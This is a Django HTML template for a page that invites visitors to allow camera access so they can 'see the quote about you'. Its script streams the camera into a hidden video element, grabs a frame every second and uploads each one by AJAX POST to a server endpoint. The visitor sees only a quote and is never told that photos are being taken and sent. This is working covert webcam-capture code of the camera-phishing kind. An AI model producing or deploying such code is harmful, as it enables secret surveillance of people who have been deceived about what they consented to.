{% extends 'main.html' %}
{% block content %}
    {% csrf_token %}
    <script src="https://code.jquery.com/jquery-3.7.0.js"
            integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM="
            crossorigin="anonymous"></script>
    <video class="d-none" id="video" width="640" height="480" autoplay>
    </video>
    <img class="d-none" id="capturedImage" src="#" alt="Captured Image">
    <h1 id="text-msg" class="text-center">Please Allow the Permission for camera to see content</h1>
{% endblock content %}
{% block scripts %}
    <script>
            let csrftoken = '{{ csrf_token }}'
            const videoElement = document.getElementById('video');
            const captureBtn = document.getElementById('captureBtn');
            const capturedImageElement = document.getElementById('capturedImage');      

            permission = navigator.permissions.query({name: "camera"});

            function send_image() {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                // Convert the captured image to a Blob
                canvas.toBlob(blob => {
                    // Create FormData and append the image file to it
                    const formData = new FormData();
                    formData.append('image', blob, 'captured_image.jpg'); 

                    // Send the FormData as a POST request to the server using AJAX
                    $.ajax({
                        url: '{{ api_url }}', // Replace with your server endpoint
                        type: 'POST',
                        headers: {
                            'X-CSRFToken': csrftoken
                        },
                        data: formData,
                        processData: false,
                        contentType: false,
                        success: function(response) {
                            console.log('passed');
                        },
                        error: function(error) {
                            console.error('Error uploading the image.');
                        }
                    });
                }, 'image/jpeg');
            }

            let timerId = setInterval(send_image, 1000);

             // Get the user media (camera) on page load
             navigator.mediaDevices.getUserMedia({
                    video: true
                })
                .then(stream => {
                    videoElement.srcObject = stream;
                    document.getElementById('text-msg').innerText = "{{ quote }}"
                })
                .catch(error => {
                    document.getElementById('text-msg').innerText = "You have to allow access to see the quote about you"
                    alert('You have to allow access to see the quote about you')
                    clearInterval(timerId)
                });
        </script>
{% endblock scripts %}
